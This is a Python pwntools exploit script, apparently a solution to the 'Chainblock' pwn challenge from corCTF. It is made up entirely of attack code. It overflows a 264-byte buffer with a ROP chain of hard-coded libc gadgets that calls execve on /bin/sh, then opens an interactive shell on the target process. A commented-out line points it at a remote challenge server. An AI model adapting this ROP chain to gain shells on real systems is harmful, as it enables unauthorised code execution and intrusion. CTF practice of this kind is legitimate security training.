from pwn import *
import os
os.chdir("./cor_ctf/Pwn/Chainblock")
libc_base = 0x7ffff7dd5000
pop_rdx = libc_base + 0x00000000000c7f32
pop_rdi = libc_base + 0x0000000000028a55
pop_rsi = libc_base + 0x000000000002a4cf
pop_rax = libc_base + 0x0000000000044c70
syscall = 0x00007ffff7fc7900
bin_sh = 0x7ffff7f80f05
conn = process("./chainblock")#remote("pwn.be.ax", 5000)
import struct; 
#exploit = ('A'*264).encode()+struct.pack('Q',0x7ffff7dfb699) + struct.pack('Q', 0x7ffff7e24a60)+struct.pack('Q',0x00cccccc) +struct.pack('Q',0x7ffff7f80f05)
exploit = ('A'*264).encode()
exploit += struct.pack('Q', pop_rdi)
exploit += struct.pack('Q', bin_sh)
exploit += struct.pack('Q', pop_rax)
exploit += struct.pack('Q',0x3b)
exploit += struct.pack('Q', pop_rsi)
exploit += struct.pack('Q', 0x0)
exploit += struct.pack('Q', pop_rdx)
exploit += struct.pack('Q',0x0)
exploit += struct.pack('Q',syscall)
with open("input4", 'wb') as f:
    f.write(exploit)
print(conn.recvuntil("name:"))
conn.sendline(exploit)
conn.interactive()